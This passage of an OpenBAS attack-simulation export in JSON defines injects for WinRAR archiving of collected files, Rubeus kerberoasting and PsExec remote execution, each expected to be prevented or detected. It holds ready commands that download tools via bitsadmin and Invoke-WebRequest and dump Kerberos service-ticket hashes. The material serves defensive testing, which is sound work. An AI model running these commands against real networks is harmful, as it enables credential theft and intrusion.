          "key" : "rar_installer",
          "default_value" : "%TEMP%\\winrar.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "rar_exe",
          "default_value" : "%programfiles%/WinRAR/Rar.exe",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ {
          "executor" : "cmd",
          "get_command" : "echo Downloading Winrar installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" #{rar_installer}\n#{rar_installer} /S\n",
          "check_command" : "if not exist \"#{rar_exe}\" (exit /b 1)\n",
          "description" : "Rar tool must be installed at specified location (#{rar_exe})\n"
        } ],
        "payload_external_id" : "02ea31cb-3b4c-4a2d-9bf1-e4e70ebcf5d0",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:24.775018Z",
        "payload_updated_at" : "2025-07-03T14:48:59.001882Z",
        "command_executor" : "cmd",
        "command_content" : "\"#{rar_exe}\" a -r #{output_file} #{input_path}\\*#{file_extension}\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:24.787632Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:24.787633Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "ebbb4608-23d9-4fd7-b099-0983910d6dfd",
        "attack_pattern_name" : "Archive via Utility",
        "attack_pattern_description" : "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",
        "attack_pattern_external_id" : "T1560.001",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "304030e2-2bb4-4236-8e56-68d81468de1e",
          "phase_external_id" : "TA0009",
          "phase_stix_id" : "x-mitre-tactic--d108ce10-2419-4cf9-a774-46161d6c6cfe",
          "phase_name" : "Collection",
          "phase_shortname" : "collection",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to either steal (exfiltrate) the data or to use the data to gain more information about the target environment. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
          "phase_order" : 10
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "8fa9fcc7-e06c-453b-b38e-fe301e76a9b9",
    "inject_title" : "Rubeus kerberoast",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ],
      "local_folder" : "PathToAtomicsFolder\\..\\ExternalPayloads",
      "local_executable" : "rubeus.exe",
      "out_file" : "rubeus_output.txt",
      "rubeus_url" : "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe",
      "flags" : null
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ {
      "dependency_relationship" : {
        "inject_parent_id" : "c49c14c2-6a85-48ce-be20-98f53d061317",
        "inject_children_id" : "8fa9fcc7-e06c-453b-b38e-fe301e76a9b9"
      },
      "dependency_condition" : {
        "mode" : "and",
        "conditions" : [ {
          "key" : "Execution",
          "value" : true,
          "operator" : "eq"
        } ]
      },
      "dependency_created_at" : "2025-07-04T15:49:57.987343Z",
      "dependency_updated_at" : "2025-07-04T15:49:57.987352Z"
    } ],
    "inject_depends_duration" : 960,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Rubeus kerberoast",
          "fr" : "Rubeus kerberoast"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "local_folder",
          "label" : "local_folder",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "PathToAtomicsFolder\\..\\ExternalPayloads",
          "type" : "text"
        }, {
          "key" : "local_executable",
          "label" : "local_executable",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "rubeus.exe",
          "type" : "text"
        }, {
          "key" : "out_file",
          "label" : "out_file",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "rubeus_output.txt",
          "type" : "text"
        }, {
          "key" : "rubeus_url",
          "label" : "rubeus_url",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe",
          "type" : "text"
        }, {
          "key" : "flags",
          "label" : "flags",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : null,
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "10112e68-451e-4bd4-95f5-f500b663d564",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "10112e68-451e-4bd4-95f5-f500b663d564",
      "injector_contract_labels" : {
        "en" : "Rubeus kerberoast",
        "fr" : "Rubeus kerberoast"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Rubeus kerberoast\",\"fr\":\"Rubeus kerberoast\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"local_folder\",\"label\":\"local_folder\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\",\"type\":\"text\"},{\"key\":\"local_executable\",\"label\":\"local_executable\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"rubeus.exe\",\"type\":\"text\"},{\"key\":\"out_file\",\"label\":\"out_file\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"rubeus_output.txt\",\"type\":\"text\"},{\"key\":\"rubeus_url\",\"label\":\"rubeus_url\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe\",\"type\":\"text\"},{\"key\":\"flags\",\"label\":\"flags\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":null,\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"10112e68-451e-4bd4-95f5-f500b663d564\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "14283d21-e64b-4cc0-8c04-d67b8a5022a1",
        "payload_type" : "Command",
        "payload_name" : "Rubeus kerberoast",
        "payload_description" : "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "f11b5ab0-7c2c-44bf-b0eb-1a497437aad2",
          "attack_pattern_name" : "Kerberoasting",
          "attack_pattern_description" : "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
          "attack_pattern_external_id" : "T1558.003",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "447bbaf6-82da-4c43-90c8-713bd6117a85",
            "phase_external_id" : "TA0006",
            "phase_stix_id" : "x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263",
            "phase_name" : "Credential Access",
            "phase_shortname" : "credential-access",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "phase_order" : 7
          } ]
        } ],
        "payload_cleanup_executor" : "psh",
        "payload_cleanup_command" : "Remove-Item \"#{local_folder}\\#{out_file}\" -ErrorAction Ignore\n",
        "payload_elevation_required" : false,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "local_folder",
          "default_value" : "PathToAtomicsFolder\\..\\ExternalPayloads",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "local_executable",
          "default_value" : "rubeus.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "out_file",
          "default_value" : "rubeus_output.txt",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "rubeus_url",
          "default_value" : "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "flags",
          "default_value" : null,
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ {
          "executor" : "psh",
          "get_command" : "Write-Host Joining this computer to a domain must be done manually\n",
          "check_command" : "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
          "description" : "Computer must be domain joined\n"
        }, {
          "executor" : "psh",
          "get_command" : "New-Item -Type Directory \"#{local_folder}\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile \"#{local_folder}\\#{local_executable}\"\n",
          "check_command" : "if(Test-Path -Path \"#{local_folder}\\#{local_executable}\") {exit 0} else {exit 1}\n",
          "description" : "Rubeus must exist\n"
        } ],
        "payload_external_id" : "14625569-6def-4497-99ac-8e7817105b55",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:36.820401Z",
        "payload_updated_at" : "2025-07-03T14:50:00.385530Z",
        "command_executor" : "psh",
        "command_content" : "klist purge\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" kerberoast #{flags} /outfile:\"#{local_folder}\\#{out_file}\"\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:36.832713Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:36.832713Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "f11b5ab0-7c2c-44bf-b0eb-1a497437aad2",
        "attack_pattern_name" : "Kerberoasting",
        "attack_pattern_description" : "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
        "attack_pattern_external_id" : "T1558.003",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "447bbaf6-82da-4c43-90c8-713bd6117a85",
          "phase_external_id" : "TA0006",
          "phase_stix_id" : "x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263",
          "phase_name" : "Credential Access",
          "phase_shortname" : "credential-access",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
          "phase_order" : 7
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "5e768f50-5299-48a2-8d5e-983720390e91",
    "inject_title" : "Copy and Execute File with PsExec",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ],
      "command_path" : "C:\\Windows\\System32\\cmd.exe",
      "remote_host" : "\\\\localhost",
      "psexec_exe" : "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe",
      "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools_zip_path" : "./ExternalPayloads/../ExternalPayloads/PsTools.zip",
      "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools_path" : "./ExternalPayloads/../ExternalPayloads/PsTools",
      "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools\\PsExec_exe_path" : "./ExternalPayloads/../ExternalPayloads/PsTools/PsExec.exe"
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1080,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Copy and Execute File with PsExec",
          "fr" : "Copy and Execute File with PsExec"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
